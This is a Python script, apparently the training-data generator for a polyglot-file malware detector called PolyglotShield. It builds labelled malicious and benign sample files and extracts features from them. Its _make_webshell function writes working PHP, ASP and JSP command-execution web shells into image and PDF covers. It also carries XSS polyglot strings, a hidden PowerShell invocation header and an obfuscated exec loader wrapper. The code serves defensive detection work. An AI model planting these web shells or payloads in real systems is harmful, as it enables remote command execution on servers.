#!/usr/bin/env python3
"""
Training Data Generator for PolyglotShield
Uses real-world polyglot patterns from:
  - Polydet/polyglot-database (100+ real polyglot files)
  - mindcrypt/polyglot (research references)
  - RedTeam Builder attack vectors
  - Polyglot Poison (PDF+PHP web shell upload)
  - Corkami polyglot research
  - PortSwigger RCE via polyglot upload

Generates labeled CSV dataset for CatBoost training.
Author: Mr-DS-ML-85
"""

import os, sys, csv, struct, math, hashlib, random, zlib, json
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))

from engines.features import extract_features, get_feature_names, _shannon
from engines.generator import SyntheticGenerator

import numpy as np


# ═══════════════════════════════════════════════════════════════
# POLYGLOT TYPE DEFINITIONS (from Polydet database + research)
# ═══════════════════════════════════════════════════════════════

# Real polyglot combinations from Polydet/polyglot-database
POLYGLOT_TYPES = {
    # ── Image + Executable ──────────────────────────────────────
    "exe_in_jpg":       {"types": ["jpg", "exe"], "severity": "critical",
                         "desc": "EXE payload in JPEG (RedTeam Builder: EXE→JPG)"},
    "exe_in_png":       {"types": ["png", "exe"], "severity": "critical",
                         "desc": "EXE payload in PNG (RedTeam Builder: EXE→PNG)"},
    "exe_in_gif":       {"types": ["gif", "exe"], "severity": "critical",
                         "desc": "EXE payload in GIF"},
    "exe_in_bmp":       {"types": ["bmp", "exe"], "severity": "critical",
                         "desc": "EXE payload in BMP"},
    "elf_in_png":       {"types": ["png", "elf"], "severity": "critical",
                         "desc": "ELF binary hidden in PNG"},
    "elf_in_jpg":       {"types": ["jpg", "elf"], "severity": "critical",
                         "desc": "ELF binary hidden in JPEG"},

    # ── Image + Script ──────────────────────────────────────────
    "bat_in_jpg":       {"types": ["jpg", "bat"], "severity": "high",
                         "desc": "BAT script in JPEG (RedTeam Builder: BAT→JPG)"},
    "vbs_in_jpg":       {"types": ["jpg", "vbs"], "severity": "high",
                         "desc": "VBS script in JPEG (RedTeam Builder: VBS→JPG)"},
    "ps1_in_png":       {"types": ["png", "ps1"], "severity": "high",
                         "desc": "PowerShell script in PNG"},

    # ── Cross-Platform Script Polyglots (Linux + macOS) ───────
    "bash_in_jpg":      {"types": ["jpg", "bash"], "severity": "high",
                         "desc": "Bash dropper in JPEG (Linux/macOS)"},
    "bash_in_png":      {"types": ["png", "bash"], "severity": "high",
                         "desc": "Bash dropper in PNG (Linux/macOS)"},
    "bash_in_pdf":      {"types": ["pdf", "bash"], "severity": "high",
                         "desc": "Bash dropper in PDF (Linux/macOS)"},
    "sh_in_jpg":        {"types": ["jpg", "sh"], "severity": "high",
                         "desc": "POSIX sh dropper in JPEG (any Unix)"},
    "sh_in_png":        {"types": ["png", "sh"], "severity": "high",
                         "desc": "POSIX sh dropper in PNG (any Unix)"},
    "py_in_jpg":        {"types": ["jpg", "py"], "severity": "high",
                         "desc": "Python dropper in JPEG (cross-platform)"},
    "py_in_png":        {"types": ["png", "py"], "severity": "high",
                         "desc": "Python dropper in PNG (cross-platform)"},
    "py_in_pdf":        {"types": ["pdf", "py"], "severity": "high",
                         "desc": "Python dropper in PDF (cross-platform)"},
    "scpt_in_jpg":      {"types": ["jpg", "scpt"], "severity": "high",
                         "desc": "AppleScript/osascript in JPEG (macOS)"},
    "scpt_in_png":      {"types": ["png", "scpt"], "severity": "high",
                         "desc": "AppleScript/osascript in PNG (macOS)"},
    "js_in_gif":        {"types": ["gif", "js"], "severity": "high",
                         "desc": "JavaScript in GIF (GIF/JS polyglot)"},
    "js_in_jpg":        {"types": ["jpg", "js"], "severity": "high",
                         "desc": "JavaScript in JPEG (CSP bypass)"},
    "html_in_png":      {"types": ["png", "html"], "severity": "high",
                         "desc": "HTML in PNG (Stegosploit)"},
    "html_in_jpg":      {"types": ["jpg", "html"], "severity": "high",
                         "desc": "HTML in JPEG (content sniffing attack)"},
    "html_in_bmp":      {"types": ["bmp", "html"], "severity": "high",
                         "desc": "HTML in BMP (Stegosploit variant)"},

    # ── PDF Polyglots (from Polydet: pocorgtfo series) ──────────
    "exe_in_pdf":       {"types": ["pdf", "exe"], "severity": "critical",
                         "desc": "EXE in PDF (Polydet: EXE+HTML+PDF)"},
    "elf_in_pdf":       {"types": ["pdf", "elf"], "severity": "critical",
                         "desc": "ELF in PDF (Polydet: PDF+ELF x86-64)"},
    "php_in_pdf":       {"types": ["pdf", "php"], "severity": "critical",
                         "desc": "PHP web shell in PDF (Polyglot Poison attack)"},
    "html_in_pdf":      {"types": ["pdf", "html"], "severity": "high",
                         "desc": "HTML+JS in PDF (Polydet: HTML+PDF)"},
    "zip_in_pdf":       {"types": ["pdf", "zip"], "severity": "medium",
                         "desc": "ZIP archive in PDF (pocorgtfo series)"},
    "wav_in_pdf":       {"types": ["pdf", "wav"], "severity": "medium",
                         "desc": "WAV audio in PDF (Polydet: PDF+WAV)"},
    "tar_in_pdf":       {"types": ["pdf", "tar"], "severity": "medium",
                         "desc": "TAR archive in PDF (Polydet: PDF+TAR)"},
    "mp3_in_pdf":       {"types": ["pdf", "mp3"], "severity": "medium",
                         "desc": "MP3 audio in PDF (Polydet: MP3+PDF)"},
    "sh_in_pdf":        {"types": ["pdf", "sh"], "severity": "high",
                         "desc": "Shell script in PDF (pocorgtfo08)"},
    "apk_in_pdf":       {"types": ["pdf", "apk"], "severity": "high",
                         "desc": "APK in PDF (pocorgtfo12)"},

    # ── Document Polyglots ──────────────────────────────────────
    "jar_in_docx":      {"types": ["docx", "jar"], "severity": "critical",
                         "desc": "JAR in DOCX (Polydet: DOCX+JAR)"},
    "elf_in_docx":      {"types": ["docx", "elf"], "severity": "critical",
                         "desc": "ELF in DOCX (Polydet: DOCX+ELF+JAR+PDF)"},
    "vbs_in_doc":       {"types": ["doc", "vbs"], "severity": "high",
                         "desc": "VBS macro script in DOC (OLE)"},
    "jar_in_odt":       {"types": ["odt", "jar"], "severity": "critical",
                         "desc": "JAR in ODT (Polydet: ODT+JAR)"},

    # ── Archive Polyglots ───────────────────────────────────────
    "elf_in_zip":       {"types": ["zip", "elf"], "severity": "critical",
                         "desc": "ELF in ZIP archive"},
    "elf_in_rar":       {"types": ["rar", "elf"], "severity": "critical",
                         "desc": "ELF in RAR (Polydet: ELF+RAR)"},
    "exe_in_zip":       {"types": ["zip", "exe"], "severity": "critical",
                         "desc": "EXE in ZIP archive"},
    "exe_in_rar":       {"types": ["rar", "exe"], "severity": "critical",
                         "desc": "EXE in RAR archive"},
    "jar_in_rar":       {"types": ["rar", "jar"], "severity": "high",
                         "desc": "JAR in RAR (Polydet: ELF+JAR+RAR)"},
    "zip_in_rar":       {"types": ["rar", "zip"], "severity": "medium",
                         "desc": "ZIP in RAR (Polydet: RAR+ZIP)"},
    "rar_in_zip":       {"types": ["zip", "rar"], "severity": "medium",
                         "desc": "RAR in ZIP (Polydet: DOCX+ELF+JAR+PDF+RAR)"},
    "zip_in_7z":        {"types": ["7z", "zip"], "severity": "medium",
                         "desc": "ZIP in 7Z (Polydet: 7ZIP+ZIP)"},
    "rar_in_7z":        {"types": ["7z", "rar"], "severity": "medium",
                         "desc": "RAR in 7Z (Polydet: 7ZIP+RAR)"},

    # ── Media Polyglots ─────────────────────────────────────────
    "exe_in_mp4":       {"types": ["mp4", "exe"], "severity": "critical",
                         "desc": "EXE in MP4 (RedTeam Builder: EXE→MP4)"},
    "bat_in_mp4":       {"types": ["mp4", "bat"], "severity": "high",
                         "desc": "BAT script in MP4 (RedTeam Builder: BAT→MP4)"},
    "jar_in_mp4":       {"types": ["mp4", "jar"], "severity": "critical",
                         "desc": "JAR in MP4 (Polydet: MP4+JAR)"},
    "zip_in_mp3":       {"types": ["mp3", "zip"], "severity": "medium",
                         "desc": "ZIP in MP3 (Polydet: MP3+ZIP)"},
    "png_in_mp3":       {"types": ["mp3", "png"], "severity": "medium",
                         "desc": "PNG in MP3 (Polydet: MP3+PNG)"},
    "zip_in_wav":       {"types": ["wav", "zip"], "severity": "medium",
                         "desc": "ZIP in WAV (Polydet: WAV+ZIP)"},
    "zip_in_webm":      {"types": ["webm", "zip"], "severity": "medium",
                         "desc": "ZIP in WebM (Polydet: WEBM+ZIP)"},
    "zip_in_swf":       {"types": ["swf", "zip"], "severity": "high",
                         "desc": "ZIP in SWF (Polydet: SWF+ZIP)"},
    "pdf_in_flac":      {"types": ["flac", "pdf"], "severity": "medium",
                         "desc": "PDF in FLAC (Polydet: FLAC+PDF)"},
    "pdf_in_ogg":       {"types": ["ogg", "pdf"], "severity": "medium",
                         "desc": "PDF in OGG (Polydet: OGG+PDF)"},

    # ── Image + Archive ─────────────────────────────────────────
    "jar_in_jpg":       {"types": ["jpg", "jar"], "severity": "critical",
                         "desc": "JAR in JPEG (Polydet: JPG+JAR)"},
    "jar_in_png":       {"types": ["png", "jar"], "severity": "critical",
                         "desc": "JAR in PNG (Polydet: PNG+JAR)"},
    "jar_in_gif":       {"types": ["gif", "jar"], "severity": "critical",
                         "desc": "JAR in GIF (Polydet: GIF+JAR)"},
    "jar_in_tiff":      {"types": ["tiff", "jar"], "severity": "critical",
                         "desc": "JAR in TIFF (Polydet: JAR+TIFF)"},
    "pdf_in_jpg":       {"types": ["jpg", "pdf"], "severity": "medium",
                         "desc": "PDF in JPEG (Polydet: JPG+PDF)"},
    "pdf_in_gif":       {"types": ["gif", "pdf"], "severity": "medium",
                         "desc": "PDF in GIF (Polydet: GIF+PDF)"},
    "pdf_in_tiff":      {"types": ["tiff", "pdf"], "severity": "medium",
                         "desc": "PDF in TIFF (Polydet: TIFF+PDF)"},
    "rar_in_tiff":      {"types": ["tiff", "rar"], "severity": "high",
                         "desc": "RAR in TIFF (Polydet: TIFF+RAR)"},
    "zip_in_tiff":      {"types": ["tiff", "zip"], "severity": "medium",
                         "desc": "ZIP in TIFF (Polydet: TIFF+ZIP)"},
    "tar_in_tiff":      {"types": ["tiff", "tar"], "severity": "medium",
                         "desc": "TAR in TIFF (Polydet: TAR+TIFF)"},
    "zip_in_gif":       {"types": ["gif", "zip"], "severity": "medium",
                         "desc": "ZIP in GIF (Polydet: GIF+TAR)"},

    # ── Web Shell Polyglots (Polyglot Poison technique) ─────────
    "php_in_jpg":       {"types": ["jpg", "php"], "severity": "critical",
                         "desc": "PHP shell in JPEG (upload bypass)"},
    "php_in_png":       {"types": ["png", "php"], "severity": "critical",
                         "desc": "PHP shell in PNG (upload bypass)"},
    "php_in_gif":       {"types": ["gif", "php"], "severity": "critical",
                         "desc": "PHP shell in GIF (GIFAR technique)"},
    "asp_in_jpg":       {"types": ["jpg", "asp"], "severity": "critical",
                         "desc": "ASP shell in JPEG (IIS upload bypass)"},
    "jsp_in_png":       {"types": ["png", "jsp"], "severity": "critical",
                         "desc": "JSP shell in PNG (Tomcat upload bypass)"},

    # ── Packed/Obfuscated ───────────────────────────────────────
    "packed_pe_upx":    {"types": ["exe"], "severity": "high",
                         "desc": "UPX-packed PE (common malware technique)"},
    "packed_pe_aspack": {"types": ["exe"], "severity": "high",
                         "desc": "ASPack-packed PE"},
    "fud_cryptor":      {"types": ["exe"], "severity": "critical",
                         "desc": "FUD-crypted payload (multi-layer obfuscation)"},

    # ── Special (from pocorgtfo + research) ─────────────────────
    "pdf_gitbundle":    {"types": ["pdf", "git"], "severity": "medium",
                         "desc": "PDF+Git bundle (pocorgtfo15/PDFGitPolyglot)"},
    "nes_in_zip":       {"types": ["zip", "nes"], "severity": "low",
                         "desc": "NES ROM in ZIP (Polydet: neszip-example)"},
    "mbr_in_pdf":       {"types": ["pdf", "mbr"], "severity": "high",
                         "desc": "MBR boot sector in PDF (pocorgtfo02)"},

    # ── PNG+Script Polyglots (berylliumsec/polyglots) ───────────
    "python_in_png":    {"types": ["png", "sh"], "severity": "high",
                         "desc": "Python script in PNG (berylliumsec: dd if=img.png bs=1 skip=N | python3)"},
    "shell_in_png":     {"types": ["png", "sh"], "severity": "high",
                         "desc": "Shell script in PNG (berylliumsec: executable polyglot PNG)"},
    "python_in_jpg":    {"types": ["jpg", "sh"], "severity": "high",
                         "desc": "Python script in JPEG (dd extraction polyglot)"},

    # ── XSS Polyglots (michenriksen/xss-polyglots) ─────────────
    "xss_in_html":      {"types": ["html", "js"], "severity": "high",
                         "desc": "XSS polyglot in HTML (michenriksen: cross-context XSS)"},
    "xss_in_svg":       {"types": ["svg", "js"], "severity": "high",
                         "desc": "XSS polyglot in SVG (onload/onmouseover injection)"},
    "xss_in_gif":       {"types": ["gif", "js"], "severity": "high",
                         "desc": "XSS polyglot in GIF (GIFAR + script injection)"},
    "xss_in_jpg":       {"types": ["jpg", "js"], "severity": "high",
                         "desc": "XSS polyglot in JPEG (CSP bypass via polyglot JPEG)"},
}

# ═══════════════════════════════════════════════════════════════
# FILE HEADER TEMPLATES
# ═══════════════════════════════════════════════════════════════

HEADERS = {
    "jpg":  b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00',
    "png":  b'\x89PNG\r\n\x1a\n',
    "gif":  b'GIF89a\x01\x00\x01\x00\x80\x00\x00',
    "bmp":  b'BM',
    "pdf":  b'%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n',
    "zip":  b'PK\x03\x04\x14\x00\x00\x00\x00\x00',
    "rar":  b'Rar!\x1a\x07\x00',
    "7z":   b'7z\xbc\xaf\x27\x1c',
    "mp4":  b'\x00\x00\x00\x1cftypisom\x00\x00\x02\x00isomiso2',
    "mp3":  b'\xff\xfb\x90\x00',
    "wav":  b'RIFF\x00\x00\x00\x00WAVEfmt \x10\x00\x00\x00',
    "webm": b'\x1a\x45\xdf\xa3',
    "swf":  b'FWS',
    "tiff": b'II\x2a\x00',
    "flac": b'fLaC\x00\x00\x00\x22',
    "ogg":  b'OggS\x00\x02',
    "html": b'<!DOCTYPE html><html><head></head><body>',
    "doc":  b'\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1',
    "docx": b'PK\x03\x04\x14\x00\x06\x00',
    "odt":  b'PK\x03\x04\x14\x00\x00\x08',
}

EXEC_HEADERS = {
    "exe":  b'MZ',
    "elf":  b'\x7fELF',
    "php":  b'<?php',
    "asp":  b'<%@',
    "jsp":  b'<%',
    "bat":  b'@echo off\r\n',
    "vbs":  b"' Script\r\nCreateObject(",
    "ps1":  b'powershell -nop -w hidden -ep bypass',
    "sh":   b'#!/bin/sh\n',
    "bash": b'#!/bin/bash\n',
    "py":   b'#!/usr/bin/env python3\n',
    "scpt": b'#!/usr/bin/osascript\n',
    "js":   b'function(){var ',
    "apk":  b'PK\x03\x04\x14\x00\x00\x08',
    "jar":  b'PK\x03\x04\x14\x00\x08\x00',
}

# End markers for appending payload after
END_MARKERS = {
    "jpg":  (b'\xff\xd9', 2),
    "png":  (b'IEND', 8),
    "gif":  (b'\x3b', 1),
    "pdf":  (b'%%EOF', 5),
    "bmp":  (b'', 0),  # BMP has no end marker, append after image data
}


# ═══════════════════════════════════════════════════════════════
# SAMPLE GENERATOR
# ═══════════════════════════════════════════════════════════════

class ComprehensiveGenerator:
    """Generate training samples from real-world polyglot patterns."""

    def __init__(self, output_dir="training_data"):
        self.output_dir = Path(output_dir)
        self.mal_dir = self.output_dir / "malware"
        self.ben_dir = self.output_dir / "benign"
        self.mal_dir.mkdir(parents=True, exist_ok=True)
        self.ben_dir.mkdir(parents=True, exist_ok=True)

    def rand_payload(self, size_range=(500, 5000)):
        size = random.randint(*size_range)
        mode = random.choice(["high", "mid", "low", "structured", "text"])
        if mode == "high":
            return os.urandom(size)
        elif mode == "mid":
            return os.urandom(size // 2) + b'\x00' * (size // 2)
        elif mode == "low":
            return (bytes(range(256)) * (size // 256 + 1))[:size]
        elif mode == "structured":
            chunks = []
            for _ in range(size // 64):
                chunks.append(bytes([random.randint(0x20, 0x7e)] * 64))
            return b''.join(chunks)[:size]
        else:
            text = b'Lorem ipsum dolor sit amet. ' * (size // 28 + 1)
            return text[:size]

    def make_cover(self, fmt, size=None):
        """Generate a realistic cover file of the given format."""
        size = size or random.randint(200, 3000)
        header = HEADERS.get(fmt, b'\x00' * 16)
        body = os.urandom(size)
        end = b''

        if fmt == "jpg":
            end = b'\xff\xd9'
        elif fmt == "png":
            # Fake IEND chunk
            end = b'\x00\x00\x00\x00IEND\xaeB`\x82'
        elif fmt == "gif":
            end = b'\x3b'
        elif fmt == "pdf":
            end = b'xref\n0 1\ntrailer<</Root 1 0 R>>\nstartxref\n0\n%%EOF\n'
        elif fmt == "bmp":
            # BMP header with DIB
            header = b'BM' + struct.pack('<I', 54 + size) + b'\x00' * 4 + struct.pack('<I', 54)
        elif fmt == "mp4":
            # ftyp atom already in header, add moov
            body = b'\x00' * 8 + b'moov' + os.urandom(size)
        elif fmt == "tiff":
            body = os.urandom(size)
        elif fmt == "webm":
            body = os.urandom(size)
        elif fmt in ("doc", "docx", "odt"):
            body = os.urandom(size)
        elif fmt in ("rar", "7z"):
            body = os.urandom(size)
        elif fmt in ("mp3", "wav", "flac", "ogg"):
            body = os.urandom(size)

        return header + body + end

    def append_payload(self, cover_data, cover_fmt, payload_data, exec_fmt):
        """Append payload after the cover's end marker."""
        if cover_fmt in END_MARKERS:
            marker, extra = END_MARKERS[cover_fmt]
            if marker:
                pos = cover_data.rfind(marker)
                if pos != -1:
                    return cover_data[:pos + extra] + payload_data

        # For formats without clear end markers, just append
        return cover_data + payload_data

    def inject_payload(self, cover_data, cover_fmt, payload_data, exec_fmt):
        """Inject payload into cover at format-appropriate position."""
        # For PDF: inject between header and trailer
        if cover_fmt == "pdf":
            eof_pos = cover_data.rfind(b'%%EOF')
            if eof_pos != -1:
                return cover_data[:eof_pos + 5] + b'\n' + payload_data + b'\n%%EOF\n'

        # For ZIP/DOCX/ODT: inject before central directory
        if cover_fmt in ("zip", "docx", "odt"):
            eocd = cover_data.rfind(b'\x50\x4b\x05\x06')
            if eocd != -1:
                return cover_data[:eocd] + payload_data + cover_data[eocd:]

        # For archives (RAR, 7Z): append
        if cover_fmt in ("rar", "7z"):
            return cover_data + payload_data

        # Default: append after end marker
        return self.append_payload(cover_data, cover_fmt, payload_data, exec_fmt)

    def generate_polyglot(self, ptype, idx):
        """Generate a single polyglot sample of the given type."""
        info = POLYGLOT_TYPES[ptype]
        types = info["types"]

        if len(types) < 2:
            # Single-type (packed PE, FUD)
            return self._gen_single_type(ptype, idx, types[0])

        cover_fmt = types[0]
        exec_fmt = types[1]

        # ── PNG+Script polyglots (berylliumsec) ─────────────────
        if ptype in ("python_in_png", "shell_in_png"):
            data = self._make_png_script_polyglot("sh" if "shell" in ptype else "py")
            ext = ".png"
            path = self.mal_dir / f"{ptype}_{idx:04d}{ext}"
            path.write_bytes(data)
            return str(path)

        if ptype == "python_in_jpg":
            data = self._make_jpg_script_polyglot()
            path = self.mal_dir / f"{ptype}_{idx:04d}.jpg"
            path.write_bytes(data)
            return str(path)

        # ── XSS polyglots (michenriksen) ────────────────────────
        if ptype.startswith("xss_in_"):
            data = self._make_xss_polyglot(cover_fmt)
            ext_map = {"html": ".html", "svg": ".svg", "gif": ".gif", "jpg": ".jpg"}
            ext = ext_map.get(cover_fmt, ".bin")
            path = self.mal_dir / f"{ptype}_{idx:04d}{ext}"
            path.write_bytes(data)
            return str(path)

        # Generate cover
        cover = self.make_cover(cover_fmt)

        # Generate payload
        exec_header = EXEC_HEADERS.get(exec_fmt, b'\x00' * 4)
        payload_body = self.rand_payload()
        payload = exec_header + payload_body

        # Special handling for web shell polyglots
        if exec_fmt in ("php", "asp", "jsp"):
            shell_code = self._make_webshell(exec_fmt)
            payload = shell_code

        # Combine
        polyglot = self.inject_payload(cover, cover_fmt, payload, exec_fmt)

        # Save
        ext_map = {"jpg": ".jpg", "jpeg": ".jpg", "png": ".png", "gif": ".gif",
                   "bmp": ".bmp", "pdf": ".pdf", "zip": ".zip", "rar": ".rar",
                   "7z": ".7z", "mp4": ".mp4", "mp3": ".mp3", "wav": ".wav",
                   "webm": ".webm", "swf": ".swf", "tiff": ".tiff", "flac": ".flac",
                   "ogg": ".ogg", "html": ".html", "doc": ".doc", "docx": ".docx",
                   "odt": ".odt", "exe": ".exe"}
        ext = ext_map.get(cover_fmt, ".bin")
        fname = f"{ptype}_{idx:04d}{ext}"
        path = self.mal_dir / fname
        path.write_bytes(polyglot)
        return str(path)

    def _make_png_script_polyglot(self, script_type="py"):
        """PNG+Script polyglot (berylliumsec technique).
        Valid PNG with script appended after IEND. Extract: dd if=img.png bs=1 skip=N | python3"""
        from PIL import Image as PILImage
        import io
        img = PILImage.new('RGB', (10, 10), color='blue')
        buf = io.BytesIO()
        img.save(buf, format='PNG')
        png_data = buf.getvalue()
        marker = b'\n#--PYTHON--#\n'
        if script_type == "sh":
            script = b'#!/bin/bash\necho "Polyglot executed"\n'
        else:
            script = b'#!/usr/bin/env python3\nprint("Polyglot executed")\n'
        return png_data + marker + script + os.urandom(random.randint(10, 50))

    def _make_jpg_script_polyglot(self):
        """JPEG+Script polyglot."""
        from PIL import Image as PILImage
        import io
        img = PILImage.new('RGB', (8, 8), color='red')
        buf = io.BytesIO()
        img.save(buf, format='JPEG')
        jpg_data = buf.getvalue()
        if jpg_data.endswith(b'\xff\xd9'):
            jpg_data = jpg_data[:-2]
        script = b'\n#!/usr/bin/env python3\nprint("JPEG polyglot")\n'
        return jpg_data + script + b'\xff\xd9' + os.urandom(20)

    def _make_xss_polyglot(self, fmt):
        """XSS polyglot (michenriksen technique). Cross-context XSS payloads."""
        xss_payloads = [
            b'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \\" onmouseover=/*<svg/*/onload=alert()//>',
            b'javascript:"/*\'/*`/*\\" /*</title></style></textarea></noscript></noembed></template></script/--><svg/onload=/*<html/*/onmouseover=alert()//>',
            b'javascript:`//\\"//\\"//</title></textarea></style></noscript></noembed></script></template><svg/onload=\'/*--><html */ onmouseover=alert()//\'>`',
            b'javascript:/*\"//\'//`//\\"//--></script></title></style></textarea></template></noembed></noscript><script>//<svg <frame */onload= alert()//</script>',
            b'javascript:alert()//\\\"//`//\'//\"//-->`//*/ alert();//</title></textarea></noscript></noembed></template><frame onload=alert()></select></script><<svg onload=alert()>',
        ]
        xss = random.choice(xss_payloads)

        if fmt == "html":
            return b'<html><body>' + xss + b'<svg onload=alert()>' + os.urandom(20) + b'</body></html>'
        elif fmt == "svg":
            return (b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert()">'
                    b'<rect width="100" height="100" fill="red"/><!-- ' + xss + b' --></svg>' + os.urandom(20))
        elif fmt == "gif":
            gif = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
            return gif + b'<script>alert("GIFAR")</script>' + os.urandom(20)
        elif fmt == "jpg":
            from PIL import Image as PILImage
            import io
            img = PILImage.new('RGB', (8, 8), color='red')
            buf = io.BytesIO()
            img.save(buf, format='JPEG')
            jpg = buf.getvalue()
            if jpg.endswith(b'\xff\xd9'):
                jpg = jpg[:-2]
            return jpg + b'\n<script>alert("JPEG-XSS")</script>\n' + b'\xff\xd9' + os.urandom(20)
        return xss + os.urandom(50)

    def _gen_single_type(self, ptype, idx, fmt):
        """Generate packed/obfuscated single-type samples."""
        pe_stub = (b'MZ' + b'\x00' * 58 + struct.pack('<I', 64) +
                   b'PE\x00\x00' + struct.pack('<H', 0x14c) + struct.pack('<H', 1) +
                   b'\x00' * 16 + b'\x00' * 224 + b'.text\x00\x00\x00' + b'\x00' * 32)

        if ptype == "packed_pe_upx":
            data = pe_stub + b'UPX0' + b'\x00' * 64 + b'UPX1' + self.rand_payload((1000, 8000))
        elif ptype == "packed_pe_aspack":
            data = pe_stub + b'.aspack' + b'\x00' * 32 + self.rand_payload((1000, 8000))
        elif ptype == "fud_cryptor":
            key = os.urandom(32)
            inner = pe_stub + self.rand_payload((500, 3000))
            encrypted = bytes(a ^ b for a, b in zip(inner, (key * (len(inner) // 32 + 1))[:len(inner)]))
            compressed = zlib.compress(encrypted, 9)
            data = b'#!/usr/bin/env python3\nimport base64,zlib\nexec(compile(zlib.decompress(base64.b85decode(b"' + \
                   __import__('base64').b85encode(compressed) + b'")),"<x>","exec"))\n'
        else:
            data = pe_stub + self.rand_payload()

        path = self.mal_dir / f"{ptype}_{idx:04d}.exe"
        path.write_bytes(data)
        return str(path)

    def _make_webshell(self, fmt):
        """Generate a web shell payload for polyglot upload attacks."""
        payload = self.rand_payload((100, 500))
        if fmt == "php":
            return b'<?php if(isset($_REQUEST["cmd"])){system($_REQUEST["cmd"]);}?>\n' + payload
        elif fmt == "asp":
            return b'<%@ Language=VBScript %>\n<%eval request("cmd")%>\n' + payload
        elif fmt == "jsp":
            return b'<%@ page import="java.util.*,java.io.*" %>\n<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>\n' + payload
        return payload

    def generate_benign(self, fmt, idx):
        """Generate a clean benign file."""
        ext_map = {"jpg": ".jpg", "png": ".png", "gif": ".gif", "pdf": ".pdf",
                   "zip": ".zip", "html": ".html", "txt": ".txt", "mp4": ".mp4",
                   "mp3": ".mp3", "doc": ".doc", "exe": ".exe", "elf": ".elf",
                   "bmp": ".bmp", "tiff": ".tiff", "wav": ".wav"}

        if fmt == "txt":
            text = f"Document {idx}\n{'=' * 40}\n\n" + "Lorem ipsum dolor sit amet. " * random.randint(10, 100)
            path = self.ben_dir / f"clean_text_{idx:04d}.txt"
            path.write_bytes(text.encode())
        elif fmt == "html":
            body = f"<html><head><title>Page {idx}</title></head><body>"
            body += f"<p>Hello world {idx}</p>" * random.randint(5, 50)
            body += "</body></html>"
            path = self.ben_dir / f"clean_html_{idx:04d}.html"
            path.write_bytes(body.encode())
        elif fmt == "exe":
            pe_stub = (b'MZ' + b'\x00' * 58 + struct.pack('<I', 64) +
                       b'PE\x00\x00' + struct.pack('<H', 0x14c) + struct.pack('<H', 1) +
                       b'\x00' * 16 + b'\x00' * 224 + b'.text\x00\x00\x00' + b'\x00' * 32)
            path = self.ben_dir / f"clean_pe_{idx:04d}.exe"
            path.write_bytes(pe_stub + self.rand_payload((2000, 15000)))
        elif fmt == "elf":
            elf_stub = (b'\x7fELF\x02\x01\x01\x00' + b'\x00' * 8 +
                        struct.pack('<H', 2) + struct.pack('<H', 0x3e) +
                        b'\x00' * 16 + struct.pack('<Q', 0x400000) +
                        struct.pack('<Q', 64) + struct.pack('<Q', 0) + b'\x00' * 12)
            path = self.ben_dir / f"clean_elf_{idx:04d}.elf"
            path.write_bytes(elf_stub + self.rand_payload((1000, 8000)))
        else:
            cover = self.make_cover(fmt)
            ext = ext_map.get(fmt, ".bin")
            path = self.ben_dir / f"clean_{fmt}_{idx:04d}{ext}"
            path.write_bytes(cover)

        return str(path)

    def generate_dataset(self, n_per_type=50, benign_multiplier=3):
        """
        Generate full labeled dataset.
        Returns list of (filepath, label, polyglot_type, severity).
        """
        samples = []

        # Generate polyglot (malware) samples
        for ptype in POLYGLOT_TYPES:
            for i in range(n_per_type):
                try:
                    path = self.generate_polyglot(ptype, i)
                    info = POLYGLOT_TYPES[ptype]
                    samples.append((path, 1, ptype, info["severity"]))
                except Exception as e:
                    print(f"  [!] Failed {ptype}_{i}: {e}")

        # Generate benign samples
        benign_fmts = ["jpg", "png", "gif", "pdf", "zip", "html", "txt",
                       "mp4", "mp3", "doc", "exe", "elf", "bmp", "tiff", "wav"]
        n_benign = n_per_type * benign_multiplier
        per_fmt = max(1, n_benign // len(benign_fmts))

        for fmt in benign_fmts:
            for i in range(per_fmt):
                try:
                    path = self.generate_benign(fmt, i)
                    samples.append((path, 0, "clean", "safe"))
                except Exception as e:
                    print(f"  [!] Failed benign_{fmt}_{i}: {e}")

        return samples


# ═══════════════════════════════════════════════════════════════
# FEATURE EXTRACTION + CSV EXPORT
# ═══════════════════════════════════════════════════════════════

def extract_and_export(samples, output_csv="training_dataset.csv"):
    """Extract features from all samples and export to CSV."""
    feature_names = get_feature_names()

    # Add metadata columns
    header = ["filepath", "label", "polyglot_type", "severity"] + feature_names

    rows = []
    failed = 0
    for filepath, label, ptype, severity in samples:
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
            features = extract_features(data)
            row = [filepath, label, ptype, severity] + features.tolist()
            rows.append(row)
        except Exception as e:
            failed += 1
            print(f"  [!] Feature extraction failed for {filepath}: {e}")

    # Write CSV
    with open(output_csv, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(header)
        writer.writerows(rows)

    return len(rows), failed


def generate_yara_training_data(samples, output_json="yara_training.json"):
    """Generate YARA rule training data from samples."""
    yara_data = []
    for filepath, label, ptype, severity in samples:
        try:
            with open(filepath, 'rb') as f:
                data = f.read()

            # Extract magic bytes and patterns
            patterns = []
            for name, sig in {
                'PE': b'MZ', 'ELF': b'\x7fELF', 'PDF': b'%PDF',
                'ZIP': b'PK', 'JAR': b'PK\x03\x04', 'RAR': b'Rar!',
                'PHP': b'<?php', 'ASP': b'<%@', 'JSP': b'<%',
                'SCRIPT': b'<script', 'BAT': b'@echo', 'VBS': b'CreateObject',
                'POWERSHELL': b'powershell', 'HTML': b'<html',
            }.items():
                if sig in data[64:]:  # Skip first 64 bytes
                    patterns.append(name)

            yara_data.append({
                'filepath': filepath,
                'label': label,
                'type': ptype,
                'severity': severity,
                'file_size': len(data),
                'entropy': _shannon(data),
                'hidden_patterns': patterns,
                'has_dual_header': len(patterns) > 1,
            })
        except:
            pass

    with open(output_json, 'w') as f:
        json.dump(yara_data, f, indent=2)
    return len(yara_data)


# ═══════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════

def main():
    import argparse
    parser = argparse.ArgumentParser(description="PolyglotShield Training Data Generator")
